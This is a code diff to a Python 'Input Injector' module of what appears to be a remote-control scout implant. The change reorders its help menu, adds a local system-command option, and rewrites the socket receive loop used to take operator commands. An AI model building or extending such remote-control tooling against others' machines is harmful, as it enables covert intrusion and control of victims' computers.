@@ -55,9 +55,10 @@ help_menu = '''\nInput Injector  Menu
 
    Global Commands :
       banner                            Display a banner
-      help                              Show the help menu
-      quit                              Quit the console
       clear                             Clear the screen
+      help                              Show the help menu
+      local <system command>            Locally execute a system command
+      quit                              Quit the console
 
    Connection commands :
       disconnect                        Make the scout disconnect and try to reconnect
@@ -84,22 +85,24 @@ help_menu = '''\nInput Injector  Menu
       dimensions                        Get the dimensions/size of screen in terms of XY
       position                          Get current mouse position on screen in terms of XY coordinates\n'''
 
-def recvall(the_socket):
-    total_data = []
+def recvall(tar_socket):
+    data = tar_socket.recv(9999)
+    if not data:
+        return ''
     while True:
-        data = the_socket.recv(8192)
-        if End in data:
-            total_data.append(data[:data.find(End)])
-            break
-        total_data.append(data)
-        if len(total_data) > 1:
-            last_pair = total_data[-2] + total_data[-1]
-            if End in last_pair:
-                total_data[-2] = last_pair[:last_pair.find(End)]
-                total_data.pop()
-                break
-    return ''.join(total_data)
-
+        if data.endswith(End):
+            try:
+                tar_socket.settimeout(1)
+                more_data = tar_socket.recv(9999)
+                if not more_data:
+                    return data[:-len(End)]
+                data += more_data
+            except (socket.timeout,socket.error):
+                tar_socket.settimeout(None)
+                return data[:-len(End)]
+        else:
+            more_data = tar_socket.recv(9999)
+            data += more_data
 
 def inject_input(injection_type, arg):
     try:
@@ -202,6 +205,7 @@ def main():
         s.sendall(pickle.dumps(scout_data) + End)
         while True:
             try:
+                s.settimeout(None)
                 data = recvall(s)
                 command = data.split(' ', 1)[0]
                 if command == 'help':
